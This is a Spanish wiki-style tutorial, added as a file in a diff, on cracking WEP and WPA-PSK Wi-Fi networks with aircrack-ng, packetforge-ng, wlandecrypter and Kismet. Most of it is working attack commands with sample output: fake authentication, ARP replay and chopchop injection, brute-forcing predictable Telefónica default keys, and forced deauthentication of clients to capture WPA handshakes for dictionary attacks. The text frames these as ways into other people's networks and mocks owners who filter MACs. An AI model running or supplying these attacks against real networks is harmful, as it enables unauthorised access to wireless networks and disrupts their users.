@@ -1,0 +1,127 @@
+Wired Equivalent Privacy es un estándar obsoleto (año 2001) de cifrado de las comunicaciones 802.11 . Se supone que debe ofrecer una seguridad equivalente al cable, pero no es en absoluto cierto.
+
+== Fundamentos ==
+Se basa en una clave estática, de 10 bytes (5 ASCII) o 26 bytes (13 ASCII) más un vector de inicializacion de 24 bits (16 millones de posibles valores). El resultado es una clave de 10 bytes=40 bits + 24=64 bits o bien de 26 bytes=104 bits + 24=128 bits de longitud, que se aplica a la trama a transmitir mediante un RC4 (XOR).
+
+Si no conocemos la clave, podemos asociarnos al AP pero no descifrar tramas (nivel 2: enlace), por tanto será imposible comunicarnos a un nivel superior (nivel 3: red).Si el AP tiene filtrado MAC, esto es, impide asociación de ciertas estaciones basándose en su MAC, tampoco podremos asociarnos. De todos modos, el cifrado WEP es inseguro por definición: el filtrado MAC, ocultación de SSID,... son impedimentos para inyectar tráfico y averiguar la clave en menos tiempo. Con más tiempo, la clave cae, ya que el ataque es de tipo determinista por correlación.
+
+Esconder el SSID sólo lo oculta en las tramas ''beacon'' que lanza el AP periódicamente para anunciar su presencia. En el resto de tramas (peticiones de asociación, re-association, probe requests y probe responses). Sólo hay que esperar a una de esas tramas para averiguar el nombre.
+
+El filtrado de MAC se puede saltar copiándolo de una estación asociada.
+
+Quitar DHCP o usar exóticas subredes tampoco es una medida de seguridad.
+
+Por todas estas razones, el WEP es inseguro. Tan sólo es cuestión de tiempo averiguar la clave, no de su complejidad.
+
+Ponemos la tarjeta en modo Monitor:
+ # ifconfig ra0 down
+ # iwconfig ra0 mode Monitor
+ # ifconfig ra0 up
+O bien con el script
+ # airmon-ng start ra0
+
+Ahora hacemos uso de herramientas de la suite aircrack-ng, para monitorizar.
+ # airodump-ng ra0 #salta por todos los canales
+ # airodump-ng ra0 -c 11 #fija el canal 11
+ # airodump-ng ra0 -c 11 -w kk #fija el 11 y guarda captura en kk*
+Esta utilidad muestra la potencia de señal, tramas recibidas, ESSID, BSSID y estaciones asociadas. Mientras se reciben tramas abrir otra terminal para ir crackeando:
+ $ aircrack-ng kk-01.cap
+
+== Inyección de paquetes para aumentar el tráfico ==
+El crackeo de una clave requiere recoger tantas tramas como sea posible. Con 100000 IVs o 200000 ya podríamos averiguar la clave. En redes de poco tráfico esto puede ser muy tedioso, asi que si nuestra tarjeta es compatible (rt2500, rt73, prism2, prismGT, rtl8180...) cabe la posibilidad de acelerar el proceso.
+
+Primero simulamos una asociación. Es importante que no haya filtrado de MAC, y que haya suficiente potencia.
+ # aireplay-ng --fakeauth 0 -a 00:C0:A8:B4:41:CA -e Casa -h 00:01:02:03:04:05 ra0
+ 13:15:19  Sending Authentication Request
+ 13:15:19  Authentication successful
+ 13:15:19  Sending Association Request
+ 13:15:19  Association successful :-)
+...y luego aplicamos una de estas técnicas:
+
+=== 1. ARP reply ===
+En este método escuchamos el medio hasta que un cliente asociado envía una petición ARP. Tras leerla, la reinyectamos:
+ # aireplay-ng --arpreplay -b 00:C0:A8:B4:41:CA -h 00:01:02:03:04:05 -x 600 ra0
+
+=== 2. Chop Chop ===
+Ciertos AP nos desautentifican al poco de empezar la inyección de ARP. El procedimiento a seguir es capturar una trama intercambiada entre el AP y el cliente (o al revés, fijarse en las mac) y a partir de esta trama, se construye una ARP.
+ # aireplay-ng --chopchop -h 00:01:02:03:04:05 ra0
+Averiguo las direcciones IP:
+ # tcpdump -s 0 -n -e -r replay_dec-1215-170239.cap
+Preparo la trama ARP válida a reinyectar:
+ # packetforge-ng --arp -y replay_dec-1215-170239.xor -h MAC_CLIENTE -a MAC_AP -k IP_CLIENTE -l IP_AP -w arp.cap
+La envío, generando tráfico válido:
+ # aireplay-ng --interactive -r arp.cap ra0
+
+=== 3. Cualquier trama ===
+En este método no necesitamos esperar a una trama ARP, ni siquiera autenticarse. Genera tráfico sin más:
+ # aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1A:2B:06:FB:15 ra0
+
+Para redes con muy poco tráfico, podemos capturar durante un día un número pequeño de paquetes (< 40). A continuación aplicamos el anterior ataque pero sin escuchar el medio, sino sobre los paquetes capturados antes:
+ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1A:2B:06:FB:15 -r 24-01.cap ra0
+
+== Método pasivo rápido ==
+Sólo sirve para las redes de Telefónica. Estas redes tienen la particularidad de que la WEP viene escrita en una pegatina en el router, y la persona que realiza la instalación, siguiendo las instrucciones del kit, suele usarla. La clave corresponde a un patrón simple, siendo predecible. Esta predecibilidad de la clave hace que sea posible atacarla por fuerza bruta empleando muy poco tiempo. Veamos un ejemplo:
+ X00013896F8E0 , clave de WLAN_E0
+ 1222222xxxx33
+
+Aquí tenemos:
+# C ó X ó Z , inicial del fabricante del router (Xavi, Zyxel, Comtrend)
+# los tres primeros bytes de la MAC, que [http://www.coffer.com/mac_find/ coincide con el fabricante]
+# últimos dos dígitos del SSID
+Los dígitos xxxx son aleatorios, y los averiguamos por fuerza bruta. Hay por tanto 65536 posibles números.
+
+El proceso consiste en identificar la red a atacar (SSID, BSSID), [http://www.fuerzaiberica.com/nil/rusoblanco/index.php?q=node/5 generar un diccionario] acorde a las anteriores reglas con 65536 posibles claves y pasárselas a aircrack.
+
+ # iwlist scan
+ # wlandecrypter 00:01:38:97:81:A0 WLAN_E0 kk
+ # airodump-ng --bssid 00:01:38:97:81:A0 -c 7 -w k2 ra0
+ # aircrack-ng -K -w kk k2-01.cap
+ # ifconfig ra0 down
+ # iwconfig ra0 essid WLAN_E0 key s:X00013896F8E0 mode managed 
+ # ifconfig ra0 up
+ # route add default gw 192.168.1.1
+
+Es neceario capturar al menos 25 IVs para aplicar aircrack. Por consiguiente, necesita que haya un cliente conectado.
+
+*http://www.xtec.net/~acastan/textos/wlan_xx.php
+
+== Crackeo más rápido aún ==
+Este método de la [http://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw/ universidad Darmstadt] se basa en aplicar una correlación a los paquetes y de este modo acelerar el crackeo. Descargar y compilar el programa con la biblioteca libpcap0.8-dev .
+
+Se usa igual que aircrack-ng pero NO funciona con ficheros .IVS, sino con ficheros .CAP (la captura completa, no sólo los IVS). No es posible generar .CAP a partir de .IVS, por cuanto el segundo es una versión recortada del primero; así que tener cuidado y no capturar con la opción --ivs.
+
+Con 25000 paquetes ya es posible recuperar una clave de 40 bits (un número pequeño aún si el router nos desautentificase).
+
+== WPA ==
+En el peor de los casos, el AP tiene cifrado WPA-PSK (Wi-Fi Protected Access - Acceso Protegido Wi-Fi Pre-Shared Key). No hay muchas opciones de averiguar la contraseña para estas redes: su clave ASCII, de 8 o 63 bytes (según el asistente Win SP2) sólo se recupera capturando el handshake de asociación de una estación y por fuerza bruta (ya ''offline'') comparándolo con un diccionario. Esto es debido a que el SSID, la clave y la MAC [http://www.informit.com/articles/article.aspx?p=370636 se cifran y se pasan por un hash] que se transmite limpio por el medio. Tanto el AP como la estación comparan (4-way handshake) el hash y si coincide se produce la asociación. 
+
+Como lo único que podemos hacer es capturar un digest (que es unidireccional), WPA sólo es crackeable por fuerza bruta sobre esta trama. En este equipo, se trabaja a razón de 180 claves por segundo. Podría acelerarse el proceso mediante rainbow tables (hashes precalculados).
+
+Forzamos una desautentificación de la estación, para así capturar su inmediata asociación. Igualmente, para aquellos cabrones que nos han puesto filtrado MAC, les dedicamos un deauth...
+ # aireplay-ng --deauth 1000 -a 00:01:38:68:42:EE -e WLAN_42 -c 00:02:6F:30:67:55 ra0
+Sobre la captura, aplicamos:
+ # aircrack-ng -w /usr/share/dict/spanish hi-01.cap
+
+Diccionarios:
+*http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists/ http://www.cotse.com/tools/wordlists1.htm 
+*http://www.cotse.com/tools/wordlists2.htm
+
+== Kismet, escudriñando ==
+Kismet es una herramienta más completa que airodump-ng. Configurar /etc/kismet/kismet.conf o en la propia línea de comando:
+ source=rt2500,ra0,ralink
+Las claves wep que sepamos las ponemos junto con el BSSID:
+ wepkey=00:11:50:06:1C:63,4040503010
+ wepkey=00:01:38:97:81:A0,58303030313338393646384530
+
+No acepta claves ASCII, así que la pasamos a hex con este script python:
+ >>> n=''
+ >>> for i in 'X00013896F8E0':
+ >>>  n+=str( "%02x" % ord(i) )
+ >>> n
+Iniciar kismet:
+ # kismet
+ # kismet -Ikismet:9 -X #canal 9 sin saltos
+Lo primero es ordenar (s , sort) por canales o potencia. Salir con Q (mayúscula).
+
+*http://www.wi-fiplanet.com/tutorials/article.php/3595531
+*http://www.kismetwireless.net/documentation.shtml
